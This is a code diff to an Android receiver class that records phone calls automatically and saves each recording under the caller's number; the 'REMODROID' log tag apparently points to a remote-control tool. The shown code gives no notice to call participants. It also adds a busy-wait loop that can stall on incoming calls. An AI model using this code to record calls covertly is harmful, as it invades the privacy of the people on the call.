@@ -22,7 +22,7 @@ public class call_rec extends BroadcastReceiver{
     private MediaRecorder mediaRecorder;
     private static int a = 0;
     private static String b = "";
-    private String number = "";
+    private static String number = "";
     private static final File RecordsPath = new File (App.get().getApplicationContext().getFilesDir().getAbsolutePath(),"Rec");
     private static int CurrentState = TelephonyManager.CALL_STATE_IDLE;
    // private final PhoneStateListener L = new CallRecorder();
@@ -32,7 +32,12 @@ public class call_rec extends BroadcastReceiver{
     public void onReceive(Context context, Intent intent) {
 //        ((TelephonyManager) Objects.requireNonNull(
 //                context.getSystemService(Context.TELEPHONY_SERVICE))).listen(L, PhoneStateListener.LISTEN_CALL_STATE);//32
-
+       if(!new File(App.get().getApplicationContext().getFilesDir(),"Rec").exists()){
+           Log.d("REMODROID",
+                   new File(App.get().getApplicationContext().getFilesDir(),"Rec").mkdir()?
+                           "Records Location Made now":
+                           "Records Location Made before");
+       }
 
        if (intent.getAction().equals("android.intent.action.PHONE_STATE")) {
 
@@ -40,9 +45,9 @@ public class call_rec extends BroadcastReceiver{
            if (!state.equals(mLastState)) {
                mLastState = state;
                if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
-
+                    while(number.equals(""));
                    String formatted_date = new SimpleDateFormat("yyyy.MM.dd_HH.mm.ss",Locale.US).format(new Date());
-                   startRecording(number + "_" + (isOutCall?"OUT":"IN") + "_"+ formatted_date);
+                   startRecording(RecordsPath.getAbsolutePath()+ "/" +number + "_" + (isOutCall?"OUT":"IN") + "_"+ formatted_date);
 
 
 
@@ -60,6 +65,7 @@ public class call_rec extends BroadcastReceiver{
        } else if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
            number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            isOutCall = true;
+           Log.d("REMODROID", "out "+ number);
        }
    }
 
@@ -68,7 +74,7 @@ public class call_rec extends BroadcastReceiver{
    private void startRecording(String outputfile) {
        try {
            isRecording = true;
-           Log.d("REMODROID", "startRecording "+outputfile);
+           Log.d("REMODROID", "startRecording "+ outputfile + ".m4a");
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
         //   mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -83,11 +89,16 @@ public class call_rec extends BroadcastReceiver{
    }
 
     private void stopRecording(){
-        Log.d("REMODROID", "stopRecording ");
-       isRecording = false;
-        mediaRecorder.stop();
-        mediaRecorder.release();
-        mediaRecorder = null;
+       try {
+           Log.d("REMODROID", "stopRecording ");
+           number = "";
+           isRecording = false;
+           mediaRecorder.stop();
+           mediaRecorder.release();
+           mediaRecorder = null;
+       }catch (Exception e){
+           Log.e("REMODROID", "startRecording "+ e.getMessage());
+       }
     }
 
 
